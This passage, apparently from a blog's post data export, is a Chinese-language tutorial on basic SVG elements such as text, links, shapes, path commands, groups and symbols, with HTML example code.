padding: 0;\n        }\n    </style>\n</head>\n\n<body>\n    <svg width=\"400\" height=\"300\" style=\"border: 1px solid #999;\">\n        <defs>\n            <g id=\"shape\" style=\"fill: inherit; stroke: #090; stroke-width: 2;\">\n                <circle r=\"40\" cx=\"180\" cy=\"140\"></circle>\n                <rect x=\"30\" y=\"40\" width=\"100\" height=\"50\"></rect>\n                <rect x=\"230\" y=\"40\" width=\"100\" height=\"50\"></rect>\n            </g>\n        </defs>\n\n        <text y=\"15\">图形1</text>\n        <use x=\"20\" y=\"20\" xlink:href=\"#shape\" style=\"fill: #009;\"></use>\n    </svg>\n</body>\n\n</html>\n```\n\n### 模板（<symbol>）\n`<symbol>` 的作用是定义一个图像模板，使用 `<use>` 标记实例化它，然后在 SVG 文档中反复使用。`<symbol>` 本身不会输出任何图像，只有使用 `<use>` 实例化后才会显示。\n\n```html\n<html lang=\"en\">\n\n<head>\n    <title>SVG 学习</title>\n    <style>\n        * {\n            margin: 0;\n            padding: 0;\n        }\n    </style>\n</head>\n\n<body>\n    <svg width=\"400\" height=\"300\" style=\"border: 1px solid #999;\">\n        <!-- symbol definition  NEVER draw -->\n        <symbol id=\"sym01\" viewBox=\"0 0 150 110\">\n            <circle cx=\"50\" cy=\"50\" r=\"40\" stroke-width=\"8\" stroke=\"red\" fill=\"red\" />\n            <circle cx=\"90\" cy=\"60\" r=\"40\" stroke-width=\"8\" stroke=\"green\" fill=\"white\" />\n        </symbol>\n    \n        <!-- actual drawing by \"use\" element -->\n        <use xlink:href=\"#sym01\" x=\"0\" y=\"0\" width=\"100\" height=\"50\" />\n        <use xlink:href=\"#sym01\" x=\"0\" y=\"50\" width=\"75\" height=\"38\" />\n        <use xlink:href=\"#sym01\" x=\"0\" y=\"100\" width=\"50\" height=\"25\" />\n    </svg>\n</body>\n\n</html>\n```","slug":"SVG/SVG 基础元素","published":1,"updated":"2021-04-28T02:34:15.251Z","_id":"cko0u1270000ay26r1p80go36","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"SVG-基础元素\"><a href=\"#SVG-基础元素\" class=\"headerlink\" title=\"SVG 基础元素\"></a>SVG 基础元素</h1><h2 id=\"SVG-元素通用属性\"><a href=\"#SVG-元素通用属性\" class=\"headerlink\" title=\"SVG 元素通用属性\"></a>SVG 元素通用属性</h2><ul>\n<li>transform 对基础图形进行变换处理（与 CSS3 中的 transform 属性有点不一致）<ul>\n<li>平移 <code>translate(50,30)</code> </li>\n<li>缩放 <code>scale(2)</code> </li>\n<li>旋转 <code>rotate(30)</code> </li>\n<li>翻转 <code>skewX()</code>、<code>skewY(10)</code></li>\n</ul>\n</li>\n<li>fill：填充色</li>\n<li>stroke：定义图形、文本等的边线颜色</li>\n</ul>\n<p>说明：支持 hover 伪类、id、class 等</p>\n<h2 id=\"SVG-元素通用-CSS-样式\"><a href=\"#SVG-元素通用-CSS-样式\" class=\"headerlink\" title=\"SVG 元素通用 CSS 样式\"></a>SVG 元素通用 CSS 样式</h2><ul>\n<li>display: 控制元素是否可见（<code>inline</code>、<code>none</code>，所有元素的初始值都为 <code>inline</code>）</li>\n<li>fill:  填充色</li>\n<li>fill-opacity: 填充色透明度</li>\n<li>stroke: 定义图形、文本等的边线颜色</li>\n<li>stroke-width: 定义图形、文字边线的宽度 </li>\n<li>stroke-opacity: 定义图形、文字边线的透明度</li>\n<li>stroke-linecap：用来定义开放式路径的端点的样式（<code>butt</code>、<code>round</code>、<code>square</code>）</li>\n<li>stroke-linejoin：用来控制两个线段之间的联合是如何绘制</li>\n<li>stroke-dasharray：用来创建虚线（如 <code>stroke-dasharray=&quot;5,5&quot;</code>）</li>\n<li>fill-rule：判断路径的哪一侧在路径所构成的形状的内部，从而判断fill属性如何给这个形状上色</li>\n</ul>\n<p><img src=\"https://mdn.mozillademos.org/files/730/SVG_Stroke_Linecap_Example.png\" alt=\"stroke-linecap 属性\"><br><img src=\"https://mdn.mozillademos.org/files/731/SVG_Stroke_Linejoin_Example.png\" alt=\"stroke-linejoin 属性\"></p>\n<h2 id=\"文本\"><a href=\"#文本\" class=\"headerlink\" title=\"文本\"></a>文本</h2><h3 id=\"SVG-文本-（-lt-text-gt-）\"><a href=\"#SVG-文本-（-lt-text-gt-）\" class=\"headerlink\" title=\"SVG 文本 （&lt;text&gt;）\"></a>SVG 文本 （<code>&lt;text&gt;</code>）</h3><p>说明：用来定义文字文本，例如 <code>&lt;text&gt;测试文字&lt;/text&gt;</code></p>\n<p>支持的样式：<code>font-family</code>，<code>font-style</code>，<code>font-weight</code>，<code>font-variant</code>，<code>font-stretch</code>，<code>font-size</code>，<code>font-size-adjust</code>，<code>kerning</code>，<code>letter-spacing</code>，<code>word-spacing</code> 和 <code>text-decoration</code></p>\n<h3 id=\"内联文本-（-lt-tspan-gt-）\"><a href=\"#内联文本-（-lt-tspan-gt-）\" class=\"headerlink\" title=\"内联文本  （&lt;tspan&gt;）\"></a>内联文本  （<code>&lt;tspan&gt;</code>）</h3><p>说明：嵌套在 <code>&lt;text&gt;</code> 标签中，与 <code>&lt;span&gt;</code> 标签类似，用于定义一组文本的样式</p>\n<h3 id=\"文本路径-（-lt-textPath-gt-）\"><a href=\"#文本路径-（-lt-textPath-gt-）\" class=\"headerlink\" title=\"文本路径  （&lt;textPath&gt;）\"></a>文本路径  （<code>&lt;textPath&gt;</code>）</h3><p>说明：嵌套在 <code>&lt;text&gt;</code> 标签中，使文字按照指定路径排列，放在 <code>&lt;text&gt;</code> 标记内部引用预定义的 <code>&lt;path&gt;</code>，引用时，使用 <code>xlink:href</code> 属性指明需要引用的路径的 ID</p>\n<h3 id=\"链接-（-lt-a-gt-）\"><a href=\"#链接-（-lt-a-gt-）\" class=\"headerlink\" title=\"链接 （&lt;a&gt;）\"></a>链接 （<code>&lt;a&gt;</code>）</h3><p>说明：创建一个 SVG 元素链接</p>\n<ul>\n<li>xlink:show</li>\n<li>xlink:actuate</li>\n<li>xlink:href</li>\n<li>target</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;800&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #aaa;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;MyPath&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M 100 200 </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">                     C 200 100 300   0 400 100</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">                     C 500 200 600 300 700 200</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">                     C 800 100 900 100 900 100&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">defs</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;https://www.baidu.com&quot;</span> <span class=\"attr\">target</span>=<span class=\"string\">&quot;_blank&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #009; cursor: pointer;&quot;</span>&gt;</span> 打开百度<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;15&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: red;&quot;</span> <span class=\"attr\">transform</span>=<span class=\"string\">&quot;rotate(30 20, 30)&quot;</span>&gt;</span></span><br><span class=\"line\">             Just test SVG! <span class=\"tag\">&lt;<span class=\"name\">tspan</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #0f0; font-size: 26px; font-style: italic;&quot;</span>&gt;</span>中国人民银行<span class=\"tag\">&lt;/<span class=\"name\">tspan</span>&gt;</span> nothing nothing nothing</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">textPath</span> <span class=\"attr\">xlink:href</span>=<span class=\"string\">&quot;#MyPath&quot;</span>&gt;</span></span><br><span class=\"line\">                SVG 基本功能测试基本功能测试基本功能测试基本功能测试基本功能测试</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">textPath</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"基本图形\"><a href=\"#基本图形\" class=\"headerlink\" title=\"基本图形\"></a>基本图形</h2><h3 id=\"矩形（-lt-rect-gt-）\"><a href=\"#矩形（-lt-rect-gt-）\" class=\"headerlink\" title=\"矩形（&lt;rect&gt;）\"></a>矩形（<code>&lt;rect&gt;</code>）</h3><ul>\n<li>x: 元素距离左边的距离</li>\n<li>y: 元素距离上边的距离</li>\n<li>width: 元素的宽度</li>\n<li>height: 元素的高度</li>\n<li>rx: 矩形 X 轴方向的半径</li>\n<li>rx: 矩形 Y 轴方向的半径</li>\n</ul>\n<h3 id=\"圆形-（-lt-circle-gt-）\"><a href=\"#圆形-（-lt-circle-gt-）\" class=\"headerlink\" title=\"圆形 （&lt;circle&gt;）\"></a>圆形 （<code>&lt;circle&gt;</code>）</h3><ul>\n<li>cx: 圆心距离 Y 轴的距离</li>\n<li>cy: 圆心距离 X 轴的距离</li>\n<li>r: 圆的半径</li>\n</ul>\n<h3 id=\"椭圆（-lt-ellipse-gt-）\"><a href=\"#椭圆（-lt-ellipse-gt-）\" class=\"headerlink\" title=\"椭圆（&lt;ellipse&gt;）\"></a>椭圆（<code>&lt;ellipse&gt;</code>）</h3><ul>\n<li>cx: 圆心距离 Y 轴的距离</li>\n<li>cy: 圆心距离 X 轴的距离</li>\n<li>rx: 圆的 X 轴的半径</li>\n<li>ry: 圆的 Y 轴的半径</li>\n</ul>\n<h3 id=\"直线（-lt-line-gt-）\"><a href=\"#直线（-lt-line-gt-）\" class=\"headerlink\" title=\"直线（&lt;line&gt;）\"></a>直线（<code>&lt;line&gt;</code>）</h3><ul>\n<li>x1: X 轴方向的起点</li>\n<li>y1: Y 轴方向的起点</li>\n<li>x2: X 轴方向的终点</li>\n<li>y2: Y 轴方向的终点</li>\n</ul>\n<h3 id=\"折线-（-lt-polyline-gt-）\"><a href=\"#折线-（-lt-polyline-gt-）\" class=\"headerlink\" title=\"折线 （&lt;polyline&gt;）\"></a>折线 （<code>&lt;polyline&gt;</code>）</h3><ul>\n<li>points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割<ul>\n<li>例如 <code>&lt;polyline points=&quot;3,3 10,40 50,100 20,150&quot;/&gt;</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"多边形-（-lt-polygen-gt-）\"><a href=\"#多边形-（-lt-polygen-gt-）\" class=\"headerlink\" title=\"多边形 （&lt;polygen&gt;）\"></a>多边形 （<code>&lt;polygen&gt;</code>）</h3><ul>\n<li>points 属性里定义了各个点的坐标，x 和 y 坐标之间用逗号分别，多个坐标之间用空格分割，并组成闭合的环形</li>\n</ul>\n<h3 id=\"路径-（-lt-path-gt-）\"><a href=\"#路径-（-lt-path-gt-）\" class=\"headerlink\" title=\"路径 （&lt;path&gt;）\"></a>路径 （<code>&lt;path&gt;</code>）</h3><ul>\n<li>d 用于定义一系列指令，例如 <code>&lt;path d=&quot;M150 0 L75 200 L225 200 Z&quot; /&gt;</code></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>参数</th>\n<th>名称</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>M</td>\n<td>x,y</td>\n<td>moveto</td>\n<td>移动到    移动虚拟画笔到指定的（x,y）坐标，仅移动不绘制</td>\n</tr>\n<tr>\n<td>m</td>\n<td>x,y</td>\n<td>moveto</td>\n<td>同M，但使用相对坐标</td>\n</tr>\n<tr>\n<td>L</td>\n<td>x,y</td>\n<td>lineto</td>\n<td>连直线到    从当前画笔所在位置绘制一条直线到指定的（x,y）坐标</td>\n</tr>\n<tr>\n<td>l</td>\n<td>x,y</td>\n<td>lineto</td>\n<td>同L，但使用相对坐标</td>\n</tr>\n<tr>\n<td>H</td>\n<td>x</td>\n<td>horizontal lineto</td>\n<td>水平连线到    绘制一条水平直线到参数指定的x坐标点，y坐标为画笔的y坐标</td>\n</tr>\n<tr>\n<td>h</td>\n<td>x</td>\n<td>horizontal lineto</td>\n<td>同H，但使用相对坐标</td>\n</tr>\n<tr>\n<td>V</td>\n<td>y</td>\n<td>vertical lineto</td>\n<td>垂直连线到    从当前位置绘制一条垂直直线到参数指定的y坐标</td>\n</tr>\n<tr>\n<td>v</td>\n<td>y</td>\n<td>vertical lineto</td>\n<td>同V，但使用相对坐标</td>\n</tr>\n<tr>\n<td>C</td>\n<td>x1,y1 x2,y2 x,y</td>\n<td>curveto 三次方贝塞尔曲线</td>\n<td>从当前画笔位置绘制一条三次贝兹曲线到参数（x,y）指定的坐标。x1，y1和x2,y2是曲线的开始和结束控制点，用于控制曲线的弧度</td>\n</tr>\n<tr>\n<td>c</td>\n<td>x1,y1 x2,y2 x,y</td>\n<td>curveto</td>\n<td>同C，但使用相对坐标</td>\n</tr>\n<tr>\n<td>S</td>\n<td>x2,y2 x,y</td>\n<td>shorthand</td>\n<td>平滑三次方贝塞尔曲线    从当前画笔位置绘制一条三次贝塞尔曲线到参数（x,y）指定的坐标。x2,y2是结束控制点。开始控制点和前一条曲线的结束控制点相同</td>\n</tr>\n<tr>\n<td>s</td>\n<td>x2,y2 x,y</td>\n<td>shorthand</td>\n<td>平滑三次方贝塞尔曲线    同S，但使用相对坐标</td>\n</tr>\n<tr>\n<td>Q</td>\n<td>x1,y1 x,y</td>\n<td>二次方贝塞尔曲线</td>\n<td>从当前画笔位置绘制一条二次方贝塞尔曲线到参数（x,y）指定的坐标。x1,y1是控制点，用于控制曲线的弧度</td>\n</tr>\n<tr>\n<td>q</td>\n<td>x1,y1 x,y</td>\n<td>二次方贝塞尔曲线</td>\n<td>同Q，但使用相对坐标</td>\n</tr>\n<tr>\n<td>T</td>\n<td>x,y</td>\n<td>平滑的二次贝塞尔曲线</td>\n<td>从当前画笔位置绘制一条二次贝塞尔曲线到参数（x,y）指定的坐标。控制点被假定为最后一次使用的控制点</td>\n</tr>\n<tr>\n<td>t</td>\n<td>x,y</td>\n<td>平滑的二次贝塞尔曲线</td>\n<td>同T，但使用相对坐标</td>\n</tr>\n<tr>\n<td>A</td>\n<td>rx,ry x-axis-rotation large-arc-flag,sweepflag x,y</td>\n<td>椭圆弧线</td>\n<td>从当前画笔位置开始绘制一条椭圆弧线到（x,y）指定的坐标。rx和ry分别为椭圆弧线水平和垂直方向上的半径。x-axis-rotation指定弧线绕x轴旋转的度数。它只在rx和ry的值不相同是有效果。large-arc-flag是大弧标志位，取值0或1，用于决定绘制大弧还是小弧。sweep-flag用于决定弧线绘制的方向</td>\n</tr>\n<tr>\n<td>a</td>\n<td>rx,ry x-axis-rotation large-arc-flag,sweepflag x,y</td>\n<td>椭圆弧线</td>\n<td>同A，但使用相对坐标</td>\n</tr>\n<tr>\n<td>Z</td>\n<td>无</td>\n<td>闭合路径</td>\n<td>从结束点绘制一条直线到开始点，闭合路径</td>\n</tr>\n<tr>\n<td>z</td>\n<td>无</td>\n<td>闭合路径</td>\n<td>同Z</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;200&quot;</span> <span class=\"attr\">rx</span>=<span class=\"string\">&quot;20&quot;</span> <span class=\"attr\">ry</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #009;stroke: #f00; stroke-width: 2; fill-opacity: 0.5; stroke-opacity: 5.2&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;290&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #0f0; fill-opacity: .4;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ellipse</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;150&quot;</span> <span class=\"attr\">rx</span>=<span class=\"string\">&quot;60&quot;</span> <span class=\"attr\">ry</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #900; stroke: #999; stroke-width: 3; stroke-opacity: .5;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">line</span> <span class=\"attr\">x1</span>=<span class=\"string\">&quot;240&quot;</span> <span class=\"attr\">y1</span>=<span class=\"string\">&quot;220&quot;</span> <span class=\"attr\">x2</span>=<span class=\"string\">&quot;395&quot;</span> <span class=\"attr\">y2</span>=<span class=\"string\">&quot;220&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;stroke: #333; stroke-width: 2;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">polyline</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;3,3 10,40 50,100 20,150 20,180 50,180 50,210 80,210 110,210&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill:none; stroke:#099; stroke-width: 1&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;110, 20 30, 40 80, 50&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: #934;&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">&quot;100,10 40,198 190,78 10,78 160,198&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M 175 200 l 150 0&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;green&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;3&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> /&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M 100 350 q 150 -300 300 0&quot;</span> <span class=\"attr\">stroke</span>=<span class=\"string\">&quot;blue&quot;</span> <span class=\"attr\">stroke-width</span>=<span class=\"string\">&quot;5&quot;</span> <span class=\"attr\">fill</span>=<span class=\"string\">&quot;none&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"结构元素\"><a href=\"#结构元素\" class=\"headerlink\" title=\"结构元素\"></a>结构元素</h2><h3 id=\"分组-（-lt-g-gt-）\"><a href=\"#分组-（-lt-g-gt-）\" class=\"headerlink\" title=\"分组 （&lt;g&gt;）\"></a>分组 （<code>&lt;g&gt;</code>）</h3><p>说明：<code>&lt;g&gt;</code> 用于分组，它能把多个元素放在一组里，对 <code>&lt;g&gt;</code> 标记的样式和渲染会作用到这个分组内的所有元素上。组内的所有元素都会继承 <code>&lt;g&gt;</code> 标记上的所有属性。用 <code>&lt;g&gt;</code> 定义的分组还可以使用 <code>&lt;use&gt;</code> 进行复制使用。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>SVG 学习<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        * &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;400&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;300&quot;</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;border: 1px solid #999;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;fill: red; stroke: #090; stroke-width: 2;&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">circle</span> <span class=\"attr\">r</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">cx</span>=<span class=\"string\">&quot;180&quot;</span> <span class=\"attr\">cy</span>=<span class=\"string\">&quot;140&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">circle</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;30&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">rect</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">rect</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;230&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;40&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;100&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;50&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span 